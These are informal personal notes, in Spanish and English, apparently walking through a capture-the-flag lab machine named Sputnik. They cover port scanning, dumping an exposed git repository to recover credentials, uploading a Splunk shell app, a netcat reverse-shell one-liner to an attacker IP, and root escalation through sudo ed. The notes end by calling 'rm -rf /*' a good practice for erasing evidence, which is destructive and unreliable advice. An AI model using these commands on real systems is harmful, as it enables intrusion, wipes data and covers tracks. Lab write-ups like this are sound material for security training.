Tiene la funcion mkt definida en la zchrc (?)

bat (cat with steroids)

which whichSystem.py | xargs bat

nmap -p- --open  -sS --min-rate 5000 -vvv -n -Pn 192.168.0.40 -oG

(min rate tramita paquetes no mas lentos que  5000 paquetes por segundo)
og formato greepeable para que por medio de regex se pueda filtrar por lo que interesa

which extractPorts (utilidad que tiene en la zchrc).. script de bash

![[das.png]]

nmap -sCV -p 8089,55555,61337 192.168.0.40 -oN portscan

every ports are running an http server

APACHE HTTPD 2.4.29(UBUNTU)
we can search on google the codename.. it can be ubuntu trusty or another ubuntu..xenial , focal ... (it is informative)


HTTPD 2.4.29 LAUNCHPAD (ON GOOGLE)

ubuntu bionic 

https://launchpad.net/ubuntu/+source/apache2/2.4.29-1ubuntu4.4

splukd its the daemon (port 8089)

whatweb (to all the servers http)

whatweb http://192.168.0.40:8089
connection reset by peer 

whatweb http://192.168.0.40:55555
```c
http://192.168.0.40:55555 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.0.40], Script, Title[Flappy Bird Game]


```
flappy bird game.. it's a game from the 2013 maybe more recent

whatweb http://192.168.0.40:61337

```
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/Sputnik$ whatweb http://192.168.0.40:61337
http://192.168.0.40:61337 [303 See Other] Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[192.168.0.40], Meta-Refresh-Redirect[http://192.168.0.40:61337/en-US/], RedirectLocation[http://192.168.0.40:61337/en-US/], Title[303 See Other], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
http://192.168.0.40:61337/en-US/ [303 See Other] Cookies[session_id_61337], Country[RESERVED][ZZ], HTTPServer[Splunkd], HttpOnly[session_id_61337], IP[192.168.0.40], RedirectLocation[http://192.168.0.40:61337/en-US/account/login?return_to=%2Fen-US%2F], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN]
http://192.168.0.40:61337/en-US/account/login?return_to=%2Fen-US%2F [200 OK] Bootstrap, Cookies[cval,splunkweb_uid], Country[RESERVED][ZZ], HTML5, HTTPServer[Splunkd], IP[192.168.0.40], Meta-Author[Splunk Inc.], Script[text/json], probably Splunk, UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=edge]


```
this have a redirect, he said that is a splunk 
search and monitorize websites, another things, it's a service (blue team)

we are going to search on this

http://192.168.0.40:55555/.git/
It's a proyect of github, sometimes we recover the proyect with gitdumper and we can navigate over the project, resources and scripts. On this way it isnt very helpfull

https://github.com/arthaud/git-dumper
we clonate the repository
git clone https://github.com/arthaud/git-dumper
we go to the repository

now we are going  to use pip3 install -r requirements.txt (on the folder arthaud git dumper) !!!! DONT USE IT AS SUDO !!!!


```
er$ python3 git_dumper.py 
usage: git-dumper [options] URL DIR
git_dumper.py: error: the following arguments are required: URL, DIR
```

Now let's specify the arguments 

python3 git_dumper.py http://192.168.0.40:55555/.git/ project

we copy the project and we use the "project" folder
we cat on "index.html" on this folder to inspect. It is just the project of the page

git log (we use this and we are going to see the comits and different thigs that were happening)

we can watch inside the comits, with this way

git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717

```
    Initial commit
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/Sputnik/git-dump
100644 blob bdb0cabc87cf50106df6e15097dff816c8c3eb34    .gitattributes
100644 blob cd2946ad76b4402e5b3cab9243a9281aad228670    .gitignore
100644 blob 8f260dadbe40cdc656eb43c0c24401bdd4255bd0    README.md
100644 blob b7c6a79fd534ed19ab1708ac7a754ca1db28b951    index.html
100644 blob f4385198ce1cab56e0b2a1c55e8863040045b085    secret
100644 blob df45033222b87c64965dce38263e6d5948fb5ec1    sheet.png
100644 blob ad295422122860df7d9a4ef0c74de1e6deb67050    sprite.js
```
here is a "secret archive"

we are going to try to see it with 

git show f4385198ce1cab56e0b2a1c55e8863040045b085

NOTHING
```
fatal: bad object f4385198ce1cab56e0b2a1c55e8863040045b08
```

we go to logs , HEAD

http://192.168.0.41:55555/.git/logs/HEAD

we found this 

https://github.com/ameerpornillos/flappy.git 

So we are going to clone it 
git clone https://github.com/ameerpornillos/flappy.git    

and we are going to se in the git log, and on the git ls-tree to see al the comits of the same comit that has the secret archive

```
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/Sputnik/git-dumper/project$ git ls-tree 07fda135aae22fa7869b3de9e450ff7cacfbc717
100644 blob bdb0cabc87cf50106df6e15097dff816c8c3eb34    .gitattributes
100644 blob cd2946ad76b4402e5b3cab9243a9281aad228670    .gitignore
100644 blob 8f260dadbe40cdc656eb43c0c24401bdd4255bd0    README.md
100644 blob b7c6a79fd534ed19ab1708ac7a754ca1db28b951    index.html
100644 blob f4385198ce1cab56e0b2a1c55e8863040045b085    secret
100644 blob df45033222b87c64965dce38263e6d5948fb5ec1    sheet.png
100644 blob ad295422122860df7d9a4ef0c74de1e6deb67050    sprite.js

```

Now we put 
```
git show f4385198ce1cab56e0b2a1c55e8863040045b085
```
A MI ME SALE ESTA PIJA DE NUEVO 

fatal: bad object f4385198ce1cab56e0b2a1c55e8863040045b085

PERO AL CHABON LE SALE 
sputnik:ameer_says_thank_you_and_good_job

EL CHABON DICE QUE TOCAMOS UN SPLUNK (ESTO SUPUESTAMENTE ES UN SPLUNK exploit ... nombre de la pagina splunk)

infosecmachines.io (S4vitar machines)

we update this to the page of spelunk, on the app, its a script

https://github.com/TBGSecurity/splunk_shells/releases/tag/1.3
we must proportionate permisions to all apps on the website
https://github.com/TBGSecurity/splunk_shells 
THIS IS THE STEP BY STEP OF THE APP

now listen on 443

and we put this comand 
![[isten.png]]

hostname -I returns us the ip of the machine that we are , and we are splunk right now
```
hostname -I
192.168.0.41 
```
ip a its an important comand too



(pw-cat -otra cosa para ponerse en escucha)

if we want to have a bash console on netcat we must use this command 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.22 443 >/tmp/f


script /dev/null -c bash (and its beter llok even)

TRATAMIENTO DE LA TTY

ctrl +z

stty raw -echo; fg

reset xterm

export TERM=xterm


```
splunk@sputnik:/$ sudo -l
[sudo] password for splunk: 
Matching Defaults entries for splunk on sputnik:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User splunk may run the following commands on sputnik:
    (root) /bin/ed
splunk@sputnik:/$ 

```
The password was the same of SPLUNK .. and we have permisions to execute /bin/ed as a root

```
sudo ed
!/bin/sh
```

whoami... 
root



now its a goot practice go to the / folder (raiz)

and remove all the evidences

cd /
rm -rf /* 2>/dev/null